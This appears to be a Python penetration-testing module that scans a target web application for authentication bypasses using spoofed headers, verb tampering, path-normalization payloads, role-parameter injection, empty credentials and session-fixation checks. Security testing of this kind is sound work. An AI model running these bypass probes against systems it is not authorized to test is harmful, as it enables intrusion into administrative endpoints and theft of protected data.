#!/usr/bin/env python3
"""
Advanced Authentication Bypass Tester
Deep analysis of authentication and authorization implementations:
  - Header removal / manipulation bypass
  - HTTP method override (X-HTTP-Method-Override)
  - Verb tampering (GET→PUT/DELETE/PATCH on protected resources)
  - Path traversal bypass (/api/v1/admin/../admin)
  - Case sensitivity bypass (/Admin vs /admin)
  - URL encoding bypass (%2f, double encoding)
  - Backup/alternate auth endpoint discovery
  - Token reuse across sessions
  - Force browsing to protected resources
  - Parameter-based role injection
  - 2FA bypass testing
  - Session fixation detection
  - Cookie manipulation for auth escalation
"""

from colorama import Fore
import requests
import urllib3
import json
import re
import time
import os
import hashlib
import logging
from urllib.parse import urlparse, urljoin, quote, unquote
from typing import Dict, List, Any, Optional, Tuple

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)


class AuthBypassTester:
    """Advanced authentication bypass testing suite"""

    # Protected paths that typically require authentication
    PROTECTED_PATHS = [
        "/admin", "/admin/", "/administrator",
        "/api/admin", "/api/v1/admin", "/api/v2/admin",
        "/dashboard", "/panel", "/control",
        "/api/users", "/api/v1/users",
        "/api/settings", "/api/v1/settings",
        "/api/config", "/api/v1/config",
        "/internal", "/api/internal",
        "/api/management", "/management",
        "/api/system", "/system",
        "/api/debug", "/debug",
        "/api/health/detailed",
        "/api/logs", "/logs",
        "/api/metrics", "/metrics",
        "/api/audit", "/audit",
        "/console", "/api/console",
        "/api/export", "/export",
        "/api/import", "/import",
    ]

    # Auth bypass headers
    BYPASS_HEADERS = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Host": "localhost"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-ProxyUser-Ip": "127.0.0.1"},
        {"X-Forwarded": "127.0.0.1"},
        {"Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "::1"},
        {"X-Forwarded-For": "0.0.0.0"},
        {"X-Forwarded-For": "127.0.0.1, 127.0.0.2"},
        {"X-Forwarded-Port": "443"},
        {"X-Forwarded-Scheme": "https"},
        {"X-Method-Override": "GET"},
        {"X-HTTP-Method-Override": "GET"},
        {"X-Override-URL": "/"},
    ]

    # Method override headers for verb tampering
    METHOD_OVERRIDE_HEADERS = [
        "X-HTTP-Method-Override",
        "X-HTTP-Method",
        "X-Method-Override",
        "_method",
    ]

    def __init__(self, target_url: str):
        self.target = target_url.rstrip("/")
        self.parsed = urlparse(self.target)
        self.base = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.findings: List[Dict[str, Any]] = []
        self.endpoints: List[str] = []
        self.protected_endpoints: List[Dict[str, Any]] = []
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })

    # ── Discover protected endpoints ─────────────────────────────
    def _discover_protected_endpoints(self):
        """Find endpoints that return 401/403 (auth-required)."""
        print(f"{Fore.CYAN}[*] Discovering protected endpoints...{Fore.RESET}", end="", flush=True)

        for path in self.PROTECTED_PATHS:
            url = f"{self.base}{path}"
            try:
                r = self.session.get(url, timeout=5, allow_redirects=False)
                if r.status_code in [401, 403]:
                    self.protected_endpoints.append({
                        "url": url,
                        "path": path,
                        "status": r.status_code,
                        "size": len(r.content),
                        "headers": dict(r.headers),
                    })
                    self.endpoints.append(url)
                elif r.status_code in [301, 302, 303, 307, 308]:
                    location = r.headers.get("Location", "")
                    if "/login" in location or "/auth" in location:
                        self.protected_endpoints.append({
                            "url": url,
                            "path": path,
                            "status": r.status_code,
                            "size": 0,
                            "redirect_to": location,
                        })
                        self.endpoints.append(url)
            except Exception:
                pass

        print(f" {Fore.GREEN}Found {len(self.protected_endpoints)} protected endpoint(s){Fore.RESET}")

    # ── Header manipulation bypass ───────────────────────────────
    def _test_header_bypass(self):
        """Test authentication bypass via header manipulation."""
        print(f"{Fore.CYAN}[*] Testing header-based authentication bypass...{Fore.RESET}", end="", flush=True)

        bypassed = 0
        for ep in self.protected_endpoints[:10]:
            url = ep["url"]
            original_status = ep["status"]

            for bypass_header in self.BYPASS_HEADERS:
                try:
                    r = self.session.get(url, headers=bypass_header, timeout=5, allow_redirects=False)
                    if r.status_code == 200 and original_status in [401, 403]:
                        header_name = list(bypass_header.keys())[0]
                        header_value = list(bypass_header.values())[0]

                        self.findings.append({
                            "type": "Authentication Bypass via Header Manipulation",
                            "severity": "critical",
                            "endpoint": url,
                            "details": (
                                f"Protected endpoint (HTTP {original_status}) bypassed using "
                                f"header '{header_name}: {header_value}'. "
                                f"Response: HTTP {r.status_code} ({len(r.content)} bytes). "
                                f"Server incorrectly trusts client-provided headers for "
                                f"authentication/authorization decisions."
                            ),
                            "method": "GET",
                        })
                        bypassed += 1
                        break  # One bypass per endpoint is enough
                except Exception:
                    pass

        print(f" {Fore.RED if bypassed else Fore.GREEN}{'BYPASSED ' + str(bypassed) if bypassed else 'No bypass found'}{Fore.RESET}")

    # ── HTTP method override bypass ──────────────────────────────
    def _test_method_override(self):
        """Test if HTTP method override headers can bypass auth."""
        print(f"{Fore.CYAN}[*] Testing HTTP method override bypass...{Fore.RESET}", end="", flush=True)

        bypassed = 0
        for ep in self.protected_endpoints[:10]:
            url = ep["url"]
            original_status = ep["status"]

            for override_header in self.METHOD_OVERRIDE_HEADERS:
                for target_method in ["GET", "OPTIONS", "HEAD"]:
                    try:
                        # Send POST with method override header
                        r = self.session.post(
                            url,
                            headers={override_header: target_method},
                            timeout=5,
                            allow_redirects=False,
                        )
                        if r.status_code == 200 and original_status in [401, 403]:
                            self.findings.append({
                                "type": "Auth Bypass via HTTP Method Override",
                                "severity": "critical",
                                "endpoint": url,
                                "details": (
                                    f"Protected endpoint bypassed using POST with "
                                    f"'{override_header}: {target_method}'. "
                                    f"Server processes the overridden method without "
                                    f"re-checking authentication."
                                ),
                                "method": "POST",
                            })
                            bypassed += 1
                            break
                    except Exception:
                        pass
                if bypassed:
                    break

        print(f" {Fore.RED if bypassed else Fore.GREEN}{'BYPASSED ' + str(bypassed) if bypassed else 'No bypass found'}{Fore.RESET}")

    # ── Verb tampering ───────────────────────────────────────────
    def _test_verb_tampering(self):
        """Test if different HTTP methods bypass authentication."""
        print(f"{Fore.CYAN}[*] Testing HTTP verb tampering...{Fore.RESET}", end="", flush=True)

        methods = ["PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE", "CONNECT"]
        bypassed = 0

        for ep in self.protected_endpoints[:8]:
            url = ep["url"]
            original_status = ep["status"]

            for method in methods:
                try:
                    r = self.session.request(method, url, timeout=5, allow_redirects=False)
                    if r.status_code == 200:
                        # OPTIONS returning 200 is normal, skip it
                        if method == "OPTIONS":
                            continue
                        # HEAD with 200 but no body is sometimes normal
                        if method == "HEAD" and len(r.content) == 0:
                            continue

                        self.findings.append({
                            "type": f"Auth Bypass via {method} Verb Tampering",
                            "severity": "high",
                            "endpoint": url,
                            "details": (
                                f"GET returns {original_status} but {method} returns 200. "
                                f"Authentication is not applied consistently across HTTP methods. "
                                f"Response size: {len(r.content)} bytes."
                            ),
                            "method": method,
                        })
                        bypassed += 1
                        break
                except Exception:
                    pass

        print(f" {Fore.RED if bypassed else Fore.GREEN}{'BYPASSED ' + str(bypassed) if bypassed else 'Consistent auth'}{Fore.RESET}")

    # ── Path traversal bypass ────────────────────────────────────
    def _test_path_bypass(self):
        """Test authentication bypass via path manipulation."""
        print(f"{Fore.CYAN}[*] Testing path traversal / normalization bypass...{Fore.RESET}", end="", flush=True)

        bypassed = 0
        for ep in self.protected_endpoints[:8]:
            path = ep["path"]
            original_status = ep["status"]

            # Generate path variations
            variations = [
                f"{path}/.",
                f"{path}/./",
                f"{path}//",
                f"/{path.lstrip('/')}",
                f"{path}/..",
                f"{path}/../{path.split('/')[-1]}",
                f"{path}%00",             # Null byte
                f"{path}%20",             # Space
                f"{path}?",               # Empty query
                f"{path}#",               # Fragment
                f"{path}..;/",            # Semicolon bypass (Tomcat)
                f"{path};",               # Semicolon
                f"/{path.lstrip('/').upper()}",  # Case variation
                f"/{path.lstrip('/').capitalize()}",
                quote(path, safe=""),      # URL-encode entire path
                path.replace("/", "%2f"),  # Encoded slashes
                path.replace("/", "%2F"),
                f"{path}%09",             # Tab
                f"{path}%0a",             # Newline
                f"/{'/' + path.lstrip('/').replace('/', '//')}",  # Double slash
            ]

            for variant in variations:
                url = f"{self.base}{variant}"
                if url == ep["url"]:
                    continue
                try:
                    r = self.session.get(url, timeout=5, allow_redirects=False)
                    if r.status_code == 200 and original_status in [401, 403]:
                        self.findings.append({
                            "type": "Auth Bypass via Path Manipulation",
                            "severity": "critical",
                            "endpoint": url,
                            "details": (
                                f"Protected path '{path}' (HTTP {original_status}) "
                                f"bypassed using path variation: '{variant}'. "
                                f"Response: HTTP {r.status_code} ({len(r.content)} bytes). "
                                f"Server-side path normalization differs from auth check."
                            ),
                            "method": "GET",
                        })
                        bypassed += 1
                        break
                except Exception:
                    pass

        print(f" {Fore.RED if bypassed else Fore.GREEN}{'BYPASSED ' + str(bypassed) if bypassed else 'No bypass found'}{Fore.RESET}")

    # ── Force browsing ───────────────────────────────────────────
    def _test_force_browsing(self):
        """Test direct access to resources behind authentication."""
        print(f"{Fore.CYAN}[*] Testing forced browsing to hidden endpoints...{Fore.RESET}", end="", flush=True)

        hidden_paths = [
            "/api/v1/admin/users", "/api/admin/config",
            "/api/internal/debug", "/api/internal/logs",
            "/api/v1/admin/export", "/api/admin/backup",
            "/api/v1/system/info", "/api/system/health",
            "/api/v1/admin/dashboard", "/api/admin/analytics",
            "/api/v1/users/all", "/api/v1/data/export",
            "/api/v1/admin/settings", "/api/admin/database",
            "/api/v1/admin/logs", "/api/admin/sessions",
            "/api/v1/admin/tokens", "/api/admin/keys",
        ]

        found = 0
        for path in hidden_paths:
            url = f"{self.base}{path}"
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200 and len(r.content) > 100:
                    self.findings.append({
                        "type": "Unprotected Administrative Endpoint",
                        "severity": "critical",
                        "endpoint": url,
                        "details": (
                            f"Administrative endpoint accessible without authentication. "
                            f"Response: HTTP 200 ({len(r.content)} bytes)."
                        ),
                        "method": "GET",
                    })
                    self.endpoints.append(url)
                    found += 1
            except Exception:
                pass

        print(f" {Fore.RED if found else Fore.GREEN}{'Found ' + str(found) + ' unprotected' if found else 'All protected'}{Fore.RESET}")

    # ── Parameter role injection ─────────────────────────────────
    def _test_role_injection(self):
        """Test if authentication can be bypassed by adding role parameters."""
        print(f"{Fore.CYAN}[*] Testing parameter-based role injection...{Fore.RESET}", end="", flush=True)

        role_params = [
            {"role": "admin"}, {"isAdmin": True}, {"is_admin": True},
            {"admin": True}, {"user_role": "administrator"},
            {"privilege": "admin"}, {"access_level": "admin"},
            {"type": "admin"}, {"group": "administrators"},
            {"permissions": "all"}, {"scope": "admin"},
        ]

        bypassed = 0
        for ep in self.protected_endpoints[:5]:
            url = ep["url"]
            original_status = ep["status"]

            for params in role_params:
                try:
                    # Test as query params
                    r = self.session.get(url, params=params, timeout=5, allow_redirects=False)
                    if r.status_code == 200 and original_status in [401, 403]:
                        self.findings.append({
                            "type": "Auth Bypass via Role Parameter Injection",
                            "severity": "critical",
                            "endpoint": url,
                            "details": (
                                f"Protected endpoint bypassed by adding query parameters: "
                                f"{params}. Server accepts client-side role assignment."
                            ),
                            "method": "GET",
                        })
                        bypassed += 1
                        break

                    # Test as POST body
                    r2 = self.session.post(url, json=params, timeout=5, allow_redirects=False)
                    if r2.status_code == 200 and original_status in [401, 403]:
                        self.findings.append({
                            "type": "Auth Bypass via Role Injection (POST body)",
                            "severity": "critical",
                            "endpoint": url,
                            "details": (
                                f"Protected endpoint bypassed by sending role data in POST body: "
                                f"{params}."
                            ),
                            "method": "POST",
                        })
                        bypassed += 1
                        break
                except Exception:
                    pass

        print(f" {Fore.RED if bypassed else Fore.GREEN}{'BYPASSED ' + str(bypassed) if bypassed else 'No injection found'}{Fore.RESET}")

    # ── Session fixation check ───────────────────────────────────
    def _test_session_fixation(self):
        """Test if the application is vulnerable to session fixation."""
        print(f"{Fore.CYAN}[*] Testing session fixation...{Fore.RESET}", end="", flush=True)

        login_paths = [
            "/api/login", "/api/v1/login", "/login",
            "/api/auth/login", "/auth/login",
        ]

        for path in login_paths:
            url = f"{self.base}{path}"
            try:
                # Step 1: Get initial session
                r1 = self.session.get(url, timeout=5)
                initial_cookies = dict(r1.cookies)

                if not initial_cookies:
                    continue

                # Step 2: Check if we can set our own session ID
                for cookie_name in initial_cookies:
                    fixed_session = requests.Session()
                    fixed_session.verify = False
                    fixed_session.cookies.set(cookie_name, "FIXED_SESSION_ID_12345")
                    try:
                        r2 = fixed_session.get(url, timeout=5)
                        if "FIXED_SESSION_ID_12345" in str(r2.cookies):
                            self.findings.append({
                                "type": "Session Fixation Vulnerability",
                                "severity": "high",
                                "endpoint": url,
                                "details": (
                                    f"Application accepts externally-set session IDs "
                                    f"for cookie '{cookie_name}'. An attacker can fix "
                                    f"a known session ID and hijack the victim's session "
                                    f"after they authenticate."
                                ),
                                "method": "GET",
                            })
                    except Exception:
                        pass
            except Exception:
                pass

        print(f" {Fore.GREEN}Done{Fore.RESET}")

    # ── Auth header removal ──────────────────────────────────────
    def _test_auth_removal(self):
        """Test what happens when authentication headers are removed."""
        print(f"{Fore.CYAN}[*] Testing authentication header removal...{Fore.RESET}", end="", flush=True)

        # Try accessing protected endpoints with various auth patterns removed
        no_auth_headers = [
            {"Authorization": ""},
            {"Authorization": "Bearer "},
            {"Authorization": "Bearer null"},
            {"Authorization": "Bearer undefined"},
            {"Authorization": "Bearer 0"},
            {"Authorization": "Basic "},
            {"Authorization": "Basic " + "Og=="},  # empty:empty base64
            {"Cookie": ""},
        ]

        bypassed = 0
        for ep in self.protected_endpoints[:5]:
            url = ep["url"]
            original_status = ep["status"]

            for headers in no_auth_headers:
                try:
                    r = self.session.get(url, headers=headers, timeout=5, allow_redirects=False)
                    if r.status_code == 200 and original_status in [401, 403]:
                        header_name = list(headers.keys())[0]
                        header_value = list(headers.values())[0]

                        self.findings.append({
                            "type": f"Auth Bypass via Empty/Null {header_name}",
                            "severity": "critical",
                            "endpoint": url,
                            "details": (
                                f"Protected endpoint bypassed by sending "
                                f"'{header_name}: {header_value or '(empty)'}'. "
                                f"Server returns HTTP 200 with {len(r.content)} bytes. "
                                f"Authentication validation accepts invalid credentials."
                            ),
                            "method": "GET",
                        })
                        bypassed += 1
                        break
                except Exception:
                    pass

        print(f" {Fore.RED if bypassed else Fore.GREEN}{'BYPASSED ' + str(bypassed) if bypassed else 'Auth enforced'}{Fore.RESET}")

    # ── Main scan ────────────────────────────────────────────────
    def scan(self):
        """Run the full authentication bypass testing suite."""
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}Starting Advanced Authentication Bypass Testing...{Fore.RESET}")

        # Phase 1: Discovery
        self._discover_protected_endpoints()

        if not self.protected_endpoints:
            print(f"{Fore.YELLOW}[!] No protected endpoints found. Testing forced browsing only.{Fore.RESET}")
            self._test_force_browsing()
            return

        # Phase 2: Active bypass testing
        self._test_header_bypass()
        self._test_method_override()
        self._test_verb_tampering()
        self._test_path_bypass()
        self._test_force_browsing()
        self._test_role_injection()
        self._test_auth_removal()
        self._test_session_fixation()

        # Summary
        if self.findings:
            crit = sum(1 for f in self.findings if f["severity"] == "critical")
            high = sum(1 for f in self.findings if f["severity"] == "high")
            print(f"\n{Fore.MAGENTA}[+] {Fore.CYAN}Auth Bypass Scan Complete: {len(self.findings)} findings ({crit} critical, {high} high){Fore.RESET}")
        else:
            print(f"\n{Fore.GREEN}[+] Auth Bypass Scan Complete: Authentication appears robust{Fore.RESET}")


def auth_bypass_scan(target: str):
    """Entry point for the orchestrator."""
    tester = AuthBypassTester(target)
    tester.scan()
    return {
        "findings": tester.findings,
        "endpoints": tester.endpoints,
    }
